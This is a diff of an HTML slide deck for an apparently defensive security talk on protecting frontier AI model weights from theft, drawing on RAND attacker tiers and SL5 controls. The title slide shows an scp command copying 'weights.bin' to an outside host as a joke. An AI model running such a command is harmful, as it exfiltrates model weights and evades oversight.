@@ -161,7 +161,7 @@ body.show-cursor #status, body.hud #status { opacity: .9; }
 .s0 { justify-content: center; gap: 28px; padding-right: 720px; }
 .s0-title { font: 900 128px/.95 var(--sans); letter-spacing: -.045em; margin-top: 8px; }
 .s0-sub { font-size: 44px; line-height: 1.25; font-weight: 500; color: #c9ccd1; max-width: 1110px; text-wrap: balance; }
-.term { font-size: 40px; margin-top: 14px; color: #d8dade; }
+.term { font-size: 30px; margin-top: 14px; color: #d8dade; white-space: nowrap; } /* scp …:~/totally_not_weights/ on one line, clear of the QR card */
 .caret { display: inline-block; width: .55em; height: 1em; background: var(--amb); vertical-align: -.12em; margin-left: 6px; animation: blink 1s steps(1) infinite; }
 @keyframes blink { 50% { opacity: 0; } }
 .s0-name { font-size: 40px; font-weight: 700; margin-top: 36px; }
@@ -271,6 +271,12 @@ body.show-cursor #status, body.hud #status { opacity: .9; }
   border-radius: 12px; letter-spacing: .04em; }
 #s1c .s1c-stamp { transform: rotate(8deg); transition: opacity .15s ease-out .45s, transform .3s cubic-bezier(.3,1.5,.5,1) .45s; }
 #s1c .s1c-stamp:not(.on) { transform: rotate(8deg) scale(2.4); }
+.s1c-photo { position: absolute; left: 1010px; top: 150px; width: 420px; height: 250px; padding: 12px 12px 34px; background: #f2f0ea; box-shadow: 0 14px 34px rgba(0,0,0,.45); transform: rotate(3.5deg); }
+/* surveillance print: grayscale, hard contrast, grain */
+.s1c-photo .img { position: absolute; inset: 12px 12px 34px; background-size: cover; background-position: center 40%; filter: grayscale(1) contrast(1.35) brightness(1.15); }
+.s1c-photo::after { content: ""; position: absolute; inset: 12px 12px 34px; opacity: .55; mix-blend-mode: overlay; pointer-events: none;
+  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.95' numOctaves='2' stitchTiles='stitch'/><feColorMatrix type='saturate' values='0'/></filter><rect width='100%' height='100%' filter='url(%23n)'/></svg>"); }
+.s1c-clip { position: absolute; left: 34px; top: -46px; width: 34px; height: 104px; transform: rotate(-6deg); filter: drop-shadow(0 2px 2px rgba(0,0,0,.35)); }
 .s1c-src { position: absolute; left: 84px; bottom: 46px; font-size: 20px; color: #67625a; }
 
 /* ===================== S2 · old vs AI espionage ===================== */
@@ -399,6 +405,10 @@ kbd { display: inline-block; font: 700 26px var(--mono); color: var(--fg); backg
   font-size: 22px; color: var(--mut); text-transform: uppercase; letter-spacing: .1em; opacity: 0; transition: opacity .5s .6s; }
 #s6 .lad-head span { text-align: right; }
 #s6 .lad-head span:first-child { grid-column: 3; }
+/* click 1: budget only (ties to Poll A's $1M / $10M / $1B); click 2: people + time */
+#s6 .st-p, #s6 .st-t { opacity: 0; transition: opacity .5s; }
+#s6[data-step="2"] .st-p, #s6[data-step="2"] .st-t, #s6[data-step="3"] .st-p, #s6[data-step="3"] .st-t,
+#s6[data-step="4"] .st-p, #s6[data-step="4"] .st-t { opacity: 1; }
 #s6[data-step]:not([data-step="0"]) .lad-head { opacity: 1; }
 #s6 .lad-mark { position: absolute; left: 1350px; top: 520px; font: 700 30px/1.25 var(--sans); color: var(--red); }
 #s6[data-step]:not([data-step="0"]):is([data-step="2"], [data-step="3"]) .lr[data-key="1M"] .lr-track { border-color: var(--red); }
@@ -529,6 +539,8 @@ kbd { display: inline-block; font: 700 26px var(--mono); color: var(--fg); backg
 .cgive { font: 700 32px var(--mono); margin-top: auto; }
 .qcard3 { border-style: dashed; border-color: var(--amb); align-items: center; justify-content: center; }
 .cq { font: 900 84px/1.05 var(--sans); color: var(--amb); text-align: center; }
+.s12-scope { font: 700 44px/1.3 var(--sans); max-width: 1500px; } /* S12 click 1 (v7.7): what SL5 can be applied to */
+.s12-scope span:first-child { color: var(--mut); }
 .slide.fwd .ccard:not(.qcard3) { animation: popin .6s cubic-bezier(.3,1.3,.5,1) both; }
 .slide.fwd .ccard:nth-child(2) { animation-delay: .2s; }
 
@@ -660,7 +672,7 @@ kbd { display: inline-block; font: 700 26px var(--mono); color: var(--fg); backg
     <div class="kicker">TLV Frontier AI Security Forum '26</div>
     <h1 class="s0-title">Stealing<br>Superintelligence</h1>
     <p class="s0-sub">Protecting from superpowers, and against rogue AI</p>
-    <p class="term mono"><span class="amb">$</span> <span class="type" data-text="scp weights.bin">scp weights.bin</span><span class="caret"></span></p>
+    <p class="term mono"><span class="amb">$</span> <span class="type" data-text="scp weights.bin root@203.0.113.7:~/totally_not_weights/">scp weights.bin root@203.0.113.7:~/totally_not_weights/</span><span class="caret"></span></p>
     <p class="s0-name">Nitzan Pomerantz</p>
   </div>
   <div class="s0-card">
@@ -724,7 +736,8 @@ Click 1 = microSD + copy stalls. Click 2 = dialog, cursor clicks Delete, copy co
 
 <section class="slide" id="s1c" data-title="What's in the file? (target package)" data-at="1:15" data-clicks="3">
   <div class="s1c-doc">
-    <div class="s1c-hd"><span>TARGET PACKAGE</span><span>EYES ONLY</span></div>
+    <div class="s1c-hd"><span>TARGET PACKAGE</span><span>TOP SECRET</span></div>
+    <div class="s1c-photo"><div class="img" data-img="01-datacenter"></div><svg class="s1c-clip" viewBox="0 0 40 120" aria-hidden="true"><path d="M28 34 V100 a12 12 0 0 1 -24 0 V20 a8 8 0 0 1 16 0 V90" fill="none" stroke="#a9adb3" stroke-width="4" stroke-linecap="round"/></svg></div>
     <div class="s1c-row"><span class="s1c-k">TARGET</span><span>Frontier AI lab, California</span></div>
     <div class="s1c-row"><span class="s1c-k">OBJECTIVE</span><span><b>model_weights.bin</b> (2.0 TB)</span></div>
     <div class="s1c-row"><span class="s1c-k">FITS ON</span><span>One $160 microSD</span></div>
@@ -822,7 +835,6 @@ If the warm-up is dropped: same line on a plain name slide.</aside>
 <section class="slide" id="s5" data-title="Poll A: vote" data-at="4:05" data-poll-current="A" data-poll-close="warm">
   <div class="pad s5">
     <div class="s5-main">
-      <div class="kicker">Your gut · no jargon yet</div>
       <h2 class="s5-q">You need to steal the flagship model weights from a top-3 AI lab <span class="amb">today</span>. What is the <span class="amb">minimum</span> level of attacker needed to pull it off?</h2>
       <div class="s5-opts">
         <div class="s5-opt"><b>1</b><span><em>$1M</em> budget: a top-tier crime syndicate or one insider</span></div>
@@ -842,7 +854,7 @@ If the warm-up is dropped: same line on a plain name slide.</aside>
   <aside class="notes">Say (while voting, ≈60s): "No jargon yet, just your gut… And no, the insiders in the room don't get to vote twice."</aside>
 </section>
 
-<section class="slide" id="s6" data-title="Poll A results → RAND ladder (S6+S7)" data-at="5:05" data-clicks="3">
+<section class="slide" id="s6" data-title="Poll A results → RAND ladder (S6+S7)" data-at="5:05" data-clicks="4">
   <div class="pad s6">
     <div class="kicker k-res" data-out="1">Minimum level of attacker to steal the weights today</div>
     <div class="kicker k-lad" data-in="1">Security Levels: who can break in?</div>
@@ -856,33 +868,33 @@ If the warm-up is dropped: same line on a plain name slide.</aside>
       <div class="lr" data-key="1B" data-opt="2">
         <div class="lr-track"><div class="lr-fill"></div></div>
         <div class="lr-res">A $1B budget: a superpower's top-priority operation</div>
-        <div class="lr-rung"><b class="sl">SL5</b><span class="who">Top cyber superpower, priority campaign</span><span class="st">1,000</span><span class="st">$1B</span><span class="st">years</span></div>
+        <div class="lr-rung"><b class="sl">SL5</b><span class="who">Top cyber superpower, priority campaign</span><span class="st st-p">1,000</span><span class="st st-b">$1B</span><span class="st st-t">years</span></div>
         <div class="lr-pct">–</div>
       </div>
       <div class="lr" data-key="10M" data-opt="1">
         <div class="lr-track"><div class="lr-fill"></div></div>
         <div class="lr-res">A $10M budget: a standard state cyber operation</div>
-        <div class="lr-rung"><b class="sl">SL4</b><span class="who">Standard state cyber operation</span><span class="st">100</span><span class="st">$10M</span><span class="st">≈1 year</span></div>
+        <div class="lr-rung"><b class="sl">SL4</b><span class="who">Standard state cyber operation</span><span class="st st-p">100</span><span class="st st-b">$10M</span><span class="st st-t">≈1 year</span></div>
         <div class="lr-pct">–</div>
       </div>
       <div class="lr" data-key="1M" data-opt="0">
         <div class="lr-track"><div class="lr-fill"></div></div>
         <div class="lr-res">A $1M budget: a top-tier crime syndicate or one insider</div>
-        <div class="lr-rung"><b class="sl">SL3</b><span class="who">Cybercrime syndicates, insiders</span><span class="st">10</span><span class="st">$1M</span><span class="st">months</span></div>
+        <div class="lr-rung"><b class="sl">SL3</b><span class="who">Cybercrime syndicates, insiders</span><span class="st st-p">10</span><span class="st st-b">$1M</span><span class="st st-t">months</span></div>
         <div class="lr-pct">–</div>
       </div>
       <div class="lr" data-key="sl2">
         <div class="lr-track"><div class="lr-fill"></div></div>
-        <div class="lr-rung"><b class="sl">SL2</b><span class="who">Professional hackers</span><span class="st">1</span><span class="st">$10K</span><span class="st">weeks</span></div>
+        <div class="lr-rung"><b class="sl">SL2</b><span class="who">Professional hackers</span><span class="st st-p">1</span><span class="st st-b">$10K</span><span class="st st-t">weeks</span></div>
       </div>
       <div class="lr" data-key="sl1">
         <div class="lr-track"><div class="lr-fill"></div></div>
-        <div class="lr-rung"><b class="sl">SL1</b><span class="who">Amateurs</span><span class="st">1</span><span class="st">$1K</span><span class="st">days</span></div>
+        <div class="lr-rung"><b class="sl">SL1</b><span class="who">Amateurs</span><span class="st st-p">1</span><span class="st st-b">$1K</span><span class="st st-t">days</span></div>
       </div>
-      <div class="lad-head mono"><span>people</span><span>budget</span><span>time</span><span class="amb">you</span></div>
+      <div class="lad-head mono"><span class="st-p">people</span><span class="st-b">budget</span><span class="st-t">time</span><span class="amb">you</span></div>
     </div>
-    <div class="lad-mark" data-in="2">◀ Frontier labs:<br>roughly here, or below</div>
-    <div class="lad-quote mono" data-in="3">"Top cyber nations run these more than 100 times per year."<span class="mut"> (RAND)</span></div>
+    <div class="lad-mark" data-in="3">◀ Frontier labs:<br>roughly here, or below</div>
+    <div class="lad-quote mono" data-in="4">"Top cyber nations run these more than 100 times per year."<span class="mut"> (RAND)</span></div>
     <p class="s6-total mono live" data-out="1"><span data-total="A" data-unit="vote">–</span></p>
     <div class="hands s6-hands" data-out="1"><span class="tag">Show of hands</span>$1M? · $10M? · $1B? · Impossible?</div>
     <div class="foot lad-foot" data-in="1"><span>RAND RR-A2849-1 (Nevo et al., 2024)</span><span class="amb">● your votes</span></div>
@@ -973,14 +985,15 @@ Tiles = real block names from github.com/nitzpo/sl5; flood = real requirement se
   <aside class="notes">"In SL5 that means real two-person rules: two people physically authorize every sensitive action together. [click] Not the startup version, where one engineer writes a 4,000-line pull request and another engineer types 'LGTM 👍' twelve seconds later from the bathroom."</aside>
 </section>
 
-<section class="slide" id="s12" data-title="RAND + Security Level 5 credit" data-at="9:35" data-clicks="1">
+<section class="slide" id="s12" data-title="RAND + Security Level 5 credit" data-at="9:35" data-clicks="2">
   <div class="pad s12">
     <div class="kicker">The building blocks</div>
     <div class="credit">
       <div class="ccard"><p class="cwho">RAND</p><p class="cwhat">Securing AI Model Weights <span class="mut">(2024)</span></p><p class="cgive amb">the attacker tiers</p></div>
       <div class="ccard"><p class="cwho">Security Level 5</p><p class="cwhat">SL5 Standard <span class="mut">(2026)</span></p><p class="cgive amb">the building blocks</p></div>
-      <div class="ccard qcard3 rise" data-in="1"><p class="cq">Price?<br>Schedule?</p></div>
+      <div class="ccard qcard3 rise" data-in="2"><p class="cq">Price?<br>Schedule?</p></div>
     </div>
+    <p class="s12-scope rise" data-in="1"><span>You can't make an arbitrary system SL5.</span> <span class="amb">You can make a narrow, purpose-built AI data center SL5.</span></p>
   </div>
   <aside class="notes">"The good news: nobody has to start from zero. RAND and Security Level 5, a nonprofit that grew out of the SL5 Task Force, did the hard part, in the open. They coined the terminology, those attacker tiers, and laid out the building blocks of a defense. Nobody had done that before. [click] What they don't do is put a price or a schedule on any of it. And the schedule turns out to be the whole story."</aside>
 </section>
@@ -3521,10 +3534,10 @@ window.SL5_POLLS = {
    "short": "How much does SL5 slow down research?",
    "q": "If you lock an AI lab inside that wall of SL5 controls today (strict air-gaps, no open internet, real two-person rules for every action), how much does it slow down AI research?",
    "o": [
-    "Barely (<10%)",
-    "Painful (10–30%)",
-    "Very painful (30–50%)",
-    "Crippling (>50%, top researchers quit)"
+    "<10%",
+    "10–30%",
+    "30–50%",
+    ">50%"
    ]
   },
   {
